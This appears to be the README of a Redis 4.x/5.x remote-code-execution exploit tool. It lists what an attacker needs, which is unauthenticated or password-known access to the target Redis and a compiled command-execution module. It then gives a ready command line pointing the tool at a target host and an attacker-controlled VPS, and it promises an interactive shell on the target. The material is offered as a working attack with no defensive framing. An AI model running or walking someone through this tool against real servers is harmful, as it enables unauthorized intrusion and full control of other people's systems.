## Redis 4.x/Redis 5.x RCE EXP
tech reference: [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).

test passed Redis 5.0.9.

## Prepare:
* Redis 4.x/5.x unauthorized access or you know its auth password.
* your PC and target Redis can comm with each other.
* compile `.so` module, reference: https://github.com/n0b0dyCN/RedisModules-ExecuteCommand

## Usage:

```bash
python3 redis-rogue-server.py --rhost <target address> --rport <target port> --lhost <vps address> --lport <vps port> [--rpasswd <redis auth>]
```

Finally, you will get a interactive shell.